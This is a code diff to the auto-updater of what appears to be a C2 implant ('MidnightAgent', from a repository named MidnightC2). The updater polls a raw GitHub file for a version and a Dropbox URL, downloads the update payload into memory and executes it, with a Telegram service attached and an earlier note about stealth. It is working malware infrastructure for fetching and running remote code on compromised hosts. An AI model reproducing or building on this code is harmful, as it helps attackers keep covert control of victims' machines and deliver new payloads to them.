@@ -3,27 +3,20 @@ using System.IO;
 using System.Net;
 using System.Threading;
 using System.Threading.Tasks;
-using System.Text;
 
 namespace MidnightAgent.Core
 {
     /// <summary>
-    /// Auto updater - periodically checks for updates and handles in-memory updates
-    /// Optimized for low memory and stealth.
+    /// Auto updater - checks for updates from a single remote config file
+    /// Format: Line 1 = "v = X.Y.Z", Line 2 = download URL
     /// </summary>
     public static class AutoUpdater
     {
-        // GitHub Version URL
-        private const string VersionUrl = "https://raw.githubusercontent.com/teelawat/MidnightC2/refs/heads/main/version.txt";
-        
-        // GitHub Raw URL for the Dropbox direct link source
-        private const string DropboxUrlSource = "https://raw.githubusercontent.com/teelawat/MidnightC2/refs/heads/main/dropbox-url-update.txt";
+        // Single source: version + download URL in one file
+        private const string UpdateConfigUrl = "https://raw.githubusercontent.com/teelawat/MidnightC2/refs/heads/main/dropbox-url-update.txt";
         
         private static Timer _timer;
 
-        /// <summary>
-        /// Start the auto updater background task
-        /// </summary>
         public static void Start(CancellationToken token)
         {
             Logger.Log("AutoUpdater started (In-Memory)");
@@ -43,36 +36,40 @@ namespace MidnightAgent.Core
             byte[] updateZip = null;
             try
             {
-                // 1. Get remote version info
-                string versionContent = DownloadStringWithRetry(VersionUrl);
-                if (string.IsNullOrEmpty(versionContent)) return;
+                // 1. Read single config file (version + URL)
+                string content = DownloadString(UpdateConfigUrl);
+                if (string.IsNullOrEmpty(content)) return;
 
-                string remoteVersion = ParseValue(versionContent, "v = ");
+                var lines = content.Split(new[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries);
+                if (lines.Length < 2) return;
+
+                // Line 1: "v = 0.6.10"
+                string remoteVersion = null;
+                if (lines[0].StartsWith("v = ")) remoteVersion = lines[0].Substring(4).Trim();
                 if (string.IsNullOrEmpty(remoteVersion)) return;
 
+                // Line 2: download URL
+                string downloadUrl = lines[1].Trim();
+                if (string.IsNullOrEmpty(downloadUrl)) return;
+
                 // 2. Compare versions
-                if (IsNewerVersion(remoteVersion, Config.Version))
+                if (!IsNewerVersion(remoteVersion, Config.Version)) return;
+
+                Logger.Log($"New update available: {remoteVersion}");
+
+                // 3. Download directly to RAM
+                updateZip = DownloadBytes(downloadUrl);
+                if (updateZip == null || updateZip.Length == 0) return;
+
+                // Ensure TelegramInstance is set
+                if (Features.UpdateFeature.TelegramInstance == null)
                 {
-                    Logger.Log($"New update available: {remoteVersion}");
-
-                    // 3. Get the direct Dropbox URL
-                    string downloadUrl = DownloadStringWithRetry(DropboxUrlSource);
-                    if (string.IsNullOrEmpty(downloadUrl)) return;
-
-                    // 4. Download directly to RAM
-                    updateZip = DownloadBytesToMemory(downloadUrl);
-                    if (updateZip == null || updateZip.Length == 0) return;
-
-                    // Ensure TelegramInstance is set
-                    if (Features.UpdateFeature.TelegramInstance == null)
-                    {
-                        Features.UpdateFeature.TelegramInstance = new Telegram.TelegramService();
-                    }
-
-                    // 5. Trigger Update from RAM
-                    var updater = new Features.UpdateFeature();
-                    updater.PerformUpdateFromBytes(updateZip, remoteVersion).Wait();
+                    Features.UpdateFeature.TelegramInstance = new Telegram.TelegramService();
                 }
+
+                // 4. Trigger Update from RAM
+                var updater = new Features.UpdateFeature();
+                updater.PerformUpdateFromBytes(updateZip, remoteVersion).Wait();
             }
             catch (Exception ex)
             {
@@ -86,7 +83,7 @@ namespace MidnightAgent.Core
             }
         }
 
-        private static string DownloadStringWithRetry(string url)
+        private static string DownloadString(string url)
         {
             try
             {
@@ -101,7 +98,7 @@ namespace MidnightAgent.Core
             catch { return null; }
         }
 
-        private static byte[] DownloadBytesToMemory(string url)
+        private static byte[] DownloadBytes(string url)
         {
             try
             {
@@ -112,7 +109,7 @@ namespace MidnightAgent.Core
                 using (Stream responseStream = response.GetResponseStream())
                 using (MemoryStream ms = new MemoryStream())
                 {
-                    byte[] buffer = new byte[8192]; // Chunk reading to avoid LOH fragmentation
+                    byte[] buffer = new byte[8192];
                     int bytesRead;
                     while ((bytesRead = responseStream.Read(buffer, 0, buffer.Length)) > 0)
                     {
@@ -122,16 +119,6 @@ namespace MidnightAgent.Core
                 }
             }
             catch { return null; }
-        }
-
-        private static string ParseValue(string content, string key)
-        {
-            var lines = content.Split(new[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries);
-            foreach (var line in lines)
-            {
-                if (line.StartsWith(key)) return line.Substring(key.Length).Trim();
-            }
-            return null;
         }
 
         private static bool IsNewerVersion(string remote, string current)
